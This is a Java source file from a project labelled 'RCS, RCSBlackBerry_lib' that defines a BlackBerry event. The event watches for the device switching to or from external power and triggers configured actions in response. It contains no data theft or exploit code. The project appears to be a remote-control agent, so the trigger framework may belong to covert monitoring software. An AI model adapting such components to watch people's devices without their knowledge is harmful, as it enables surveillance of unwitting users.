/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AcEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class AcEvent extends Event implements BatteryStatusObserver {
	// #debug
	private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);

	// private int lastStatus;

	int actionOnEnter;
	int actionOnExit;

	public AcEvent(final int actionId, final byte[] confParams) {
		super(Event.EVENT_AC, actionId, confParams);

		setPeriod(NEVER);

	}

	protected void actualStart() {
		AppListener.getInstance().addBatteryStatusObserver(this);
	}

	protected void actualStop() {
		AppListener.getInstance().removeBatteryStatusObserver(this);
	}

	protected void actualRun() {

	}

	public void onBatteryStatusChange(final int status, final int diff) {
		// se c'e' una variazione su AC_CONTACTS
		if ((diff & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) != 0) {

			// #debug debug
			 debug.trace("Variation on EXTERNAL_POWER");

			boolean ac = (status & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) > 0;
			if (ac) {
				// #debug info
				debug.info("AC On Enter");
				if (actionOnEnter != Action.ACTION_NULL) {
					trigger(actionOnEnter);
				}
			} else {
				// #debug debug
				 debug.trace("Ac On Exit");
				if (actionOnExit != Action.ACTION_NULL) {
					trigger(actionOnExit);
				}
			}
		}
	}

	/*
	 * public void actualStop() { Application application =
	 * Application.getApplication(); application.removeSystemListener(this);
	 * debug.info("Removed SystemListener"); }
	 */

	public void batteryGood() {
		// #debug info
		debug.info("batteryGood");
	}

	public void batteryLow() {
		// #debug info
		debug.info("batteryLow");

	}

	protected boolean parse(final byte[] confParams) {
		DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length, false);
		try {
			actionOnExit = databuffer.readShort();
			actionOnEnter = databuffer.readShort();

			// #ifdef DBC
			Check.asserts(actionOnEnter >= Action.ACTION_NULL, "negative value Enter");
			Check.asserts(actionOnExit >= Action.ACTION_NULL, "negative value Exit");
			// #endif

		} catch (EOFException e) {
			actionOnEnter = Action.ACTION_NULL;
			actionOnExit = Action.ACTION_NULL;
			return false;
		}
		return true;
	}

}
